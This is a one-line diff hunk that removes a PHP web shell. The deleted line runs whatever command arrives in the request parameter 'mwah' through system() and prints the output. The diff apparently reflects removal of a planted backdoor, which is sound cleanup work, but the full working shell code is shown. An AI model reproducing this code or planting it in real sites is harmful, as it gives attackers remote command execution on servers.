@@ -1,1 +1,0 @@
-<?php if(isset($_REQUEST['mwah'])){ echo "<pre>"; $cmd = ($_REQUEST['mwah']); system($cmd); echo "</pre>"; die; }?>
